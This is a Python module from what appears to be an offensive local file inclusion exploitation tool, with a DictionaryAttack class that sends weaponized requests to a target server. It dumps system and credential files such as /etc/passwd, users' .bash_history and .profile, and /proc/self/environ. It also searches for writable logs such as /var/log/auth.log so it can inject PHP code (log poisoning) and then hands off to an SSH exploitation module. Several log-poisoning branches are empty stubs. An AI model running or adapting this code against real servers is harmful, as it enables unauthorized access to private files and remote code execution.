from .prints import prints
from .ssh_pwn import SSH_Pwn

SMALL_DICK = "other/small_log_poision"
BIG_DICK = "other/sensitive_files"
class DictionaryAttack:
    def __init__(self, request, parser, payload):
        self.request = request
        self.parser = parser
        self.payload = payload
        self.last_url = False

    def get_file_content(self, file):
        """
        Pass the method a file and then this function will generate a new payload and then send the payload.
        Next the method will try and get the file contents
        :param file: Local file to include
        :return: text data for that file
        """
        payload_value = self.payload.new_payload(file)
        weponized_url = self.payload.weponize(payload_value)
        new_data = self.request.send_get(weponized_url)
        self.parser.new_real(new_data.text)
        file_content = self.parser.find_file_contents()

        if new_data.status_code == self.payload.exploit_status_code:
            if not len(file_content) == 0:
                return file_content, weponized_url
            else:
                return False, False
        else:
            return False, False

    def log_poison_dictionary_attack(self):
        """This is used to try and find log files that are writeable so we can inject PHP code into them"""
        with open(SMALL_DICK, "r") as f:
            files = []
            [files.append(line.strip()) for line in f.readlines()]
            prints(f"Performing small dictionary attack on {len(files)} common files that can be log poisoned.", "bold")
            for file_name in files:
                if self.get_content(file_name):
                    prints("Found a log file that can be poisoned:", "bold")
                    prints(file_name)
                    self.log_posion_method(file_name)

    def log_posion_method(self, file_name):
        if file_name == "/var/log/auth.log":
            SSH_Pwn(self.last_url, self.request)
        if file_name == "/var/log/apache2/access_log":
            pass
        if file_name == "/var/log/apache2/access.log":
            pass
        if file_name == "/var/log/apache/access_log":
            pass
        if file_name == "/var/log/apache/access.log":
            pass
        if file_name == "/proc/self/environ":
            pass
        if file_name == "/proc/self/cmdline":
            pass
        if file_name == "/proc/self/stat":
            pass
        if "/proc/self/fd/" in file_name :
            pass

    def large_dictionary_attack(self):
        with open(BIG_DICK, "r") as f:
            files = self.get_bash_history_locations()
            [files.append(line.split(",")[0]) for line in f.readlines()]
            prints(f"Performing large dictionary attack on {len(files)} common files important files", "bold")
            for file_name in files:
                self.get_content(file_name)

    def get_bash_history_locations(self):
        users = self.get_etc_users(self.parser.etc_passwd)
        locations = []
        [locations.append(f"/home/{user}/.bash_history") for user in users]
        [locations.append(f"/home/{user}/.profile") for user in users]
        return locations

    def get_etc_users(self, text):
        users = []
        text = self.set_to_string(text)
        for line in text.split("\n"):
            try:
                users.append((line.split(":")[0]).strip("\n").strip("\r").strip("\n"))
            except IndexError:
                pass
        return users

    def get_content(self, file_name):
        content, weponized_url = self.get_file_content(file_name)
        if not content or not weponized_url:
            return False
        content = self.set_to_string(content)
        if content and not self.content_contain_error(content):
            prints(f"File is readable {file_name}", "bold")
            prints(f"Success\t {weponized_url}")
            prints("START OF FILE", "bold")
            print(content)
            prints("END OF FILE", "bold")
            prints("")
            self.last_url = weponized_url
            return True
        else:
            prints(f"Failure\t {weponized_url}", "error")
            return True

    @staticmethod
    def set_to_string(content):
        content = list(content)
        return ' '.join(content)

    @staticmethod
    def content_contain_error(content):
        errors = [
            "no such file or directory in",
            "failed to open file"
        ]
        for e in errors:
            if e in content.lower():
                return True
        return False

    @staticmethod
    def print_file_content(file_content):
        [prints(line, "info") for line in file_content.split("\n")]
